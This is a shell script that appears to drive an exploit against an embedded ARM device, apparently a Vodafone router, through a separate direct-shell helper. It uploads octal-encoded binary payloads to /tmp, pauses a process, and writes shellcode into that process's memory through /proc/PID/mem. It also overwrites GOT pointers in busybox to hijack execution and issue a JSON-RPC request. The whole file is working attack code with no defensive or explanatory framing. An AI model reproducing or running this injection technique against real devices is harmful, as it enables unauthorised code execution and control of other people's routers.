#!/bin/sh
set -eu

host="${1:-192.168.100.11}"
if [ "$#" -ge 2 ]; then
    request=$2
else
    request='{"jsonrpc":"2.0","method":"get_backends","params":{},"id":1}'
fi
image=arm_ws_rpc_mem.bin
bootstrap=arm_ws_rpc_bootstrap.bin

octal=$(od -An -v -to1 "$image" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')
boot_octal=$(od -An -v -to1 "$bootstrap" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')

{
    sleep 2
    printf ': >/tmp/arm_ws_rpc.bin; : >/tmp/wsdiag; /bin/busybox rm -f /tmp/wsresp\n'
    printf "printf '%%s' '%s' >/tmp/wsreq\n" "$request"
    printf '%s\n' "$octal" | fold -w 768 | while IFS= read -r chunk; do
        printf "printf '%s' >>/tmp/arm_ws_rpc.bin\n" "$chunk"
    done
    printf "printf '%s' >/tmp/arm_ws_rpc_bootstrap.bin\n" "$boot_octal"
    printf '%s\n' '/bin/dd if=/dev/zero of=/dev/null bs=4096 & p=$!; /bin/sleep 1; kill -STOP $p; base=$(/usr/bin/awk '\''$6=="/bin/busybox"&&$3=="00000000"{split($1,a,"-");print a[1];exit}'\'' /proc/$p/maps); image=$((0x$base+0x74000)); rgot=$((0x$base+0x8fb08)); wgot=$((0x$base+0x8fdf4)); /bin/dd if=/tmp/arm_ws_rpc.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; /bin/dd if=/tmp/arm_ws_rpc_bootstrap.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; printf "\\$(printf %03o $((image&255)))\\$(printf %03o $(((image>>8)&255)))\\$(printf %03o $(((image>>16)&255)))\\$(printf %03o $(((image>>24)&255)))" >/tmp/arm_ws_rpc_pointer.bin; /bin/dd if=/tmp/arm_ws_rpc_pointer.bin of=/proc/$p/mem bs=1 seek=$rgot conv=notrunc; /bin/dd if=/tmp/arm_ws_rpc_pointer.bin of=/proc/$p/mem bs=1 seek=$wgot conv=notrunc; kill -CONT $p; /bin/sleep 6; /bin/echo WS_DIAG=$(/bin/cat /tmp/wsdiag 2>/dev/null); /bin/ls -l /tmp/wsresp 2>/dev/null; /usr/bin/od -An -v -tx1 /tmp/wsresp 2>/dev/null; /bin/echo WS_RAW_BEGIN; /bin/cat /tmp/wsresp 2>/dev/null; /bin/echo; /bin/echo WS_RAW_END; kill -KILL $p 2>/dev/null || true'
    sleep 5
} | timeout 24 ./vodafone-direct-shell.sh "$host" 9536
